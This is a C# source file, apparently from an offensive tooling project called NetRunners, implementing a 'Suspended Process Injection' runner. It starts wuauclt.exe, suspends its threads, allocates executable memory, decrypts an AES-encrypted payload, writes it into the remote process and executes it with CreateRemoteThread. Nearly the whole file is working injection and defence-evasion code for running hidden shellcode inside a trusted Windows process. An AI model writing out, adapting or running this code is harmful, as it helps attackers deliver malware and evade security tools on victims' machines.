using System;
using System.Collections.Generic;
using System.Diagnostics;

using NetRunners.Interfaces;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Helpers.Helper;
using static NetRunners.Data.WinConstants;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    // credits: https://github.com/tasox/CSharp_Process_Injection/tree/main/02.%20Process_Injection_template_(High%20Level%20Windows%20API)%20-%20Suspend
    public class SuspendedProcessInjectionRunner : IRunner
    {
        public void Run()
        {
            byte[] buf;
            IntPtr hProcess = default;

            string techniqueName = "Suspended Process Injection";
            string targetProcess = "wuauclt.exe";                       // suffix needed
            PrintTechniqueInfo(techniqueName, targetProcess);

            ProcessStartInfo startInfo = new ProcessStartInfo(targetProcess);
            startInfo.Arguments = "/UpdateDeploymentProvider aadauthhelper.dll /RunHandlerComServer";
            Process.Start(startInfo);

            Process[] procName = Process.GetProcessesByName(targetProcess.Split('.')[0]);       // name without extension
            int processID = 0;
            bool IsRemote32BitProcess = false;
            foreach (Process process in procName)
            {
                //Open remote process
                processID = process.Id;
                hProcess = OpenProcess(0x001F0FFF, 0, (uint)process.Id);
                IsWow64Process(hProcess, out IsRemote32BitProcess);

                foreach (ProcessThread thread in process.Threads)
                {
                    IntPtr pThread = OpenThread(THREAD_SUSPEND_RESUME, false, (uint)thread.Id);

                    if (pThread == IntPtr.Zero)
                    {
                        continue;
                    }
                    SuspendThread(pThread);

                    CloseHandle(pThread);
                }
            }

            //Allocate space
            int sBuf = SelectPayloadSize(IsRemote32BitProcess);
            IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // to-do use exec_read then change protect with virtualprotect

            var allocAddress = string.Format("{0:X}", pRMemory); // Pointer -> String
            UInt64 number = UInt64.Parse(allocAddress); // String -> Int
            string allocAddressHex = number.ToString("x"); // Int -> Hex
            Console.WriteLine("[+] Executable Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);

            // select and decrypt payload
            buf = SelectPayloadArchitecture();
            buf = DecryptBytesToBytesAes(buf, AesKey);

            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    
                    //Convert DEC->HEX
                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
                    string bufHex = bufInt.ToString("x"); //Integer -> Hex

                    Console.WriteLine("[+] Payload Address on this executable: " + "0x" + bufHex);
                }
            }
            IntPtr outSize;

            //Write to remote process
            WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
            Console.WriteLine("[+] Payload has been written to the buffer!");
            
            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            //Create a remote thread and execute it
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }
            }
        }
    }
}
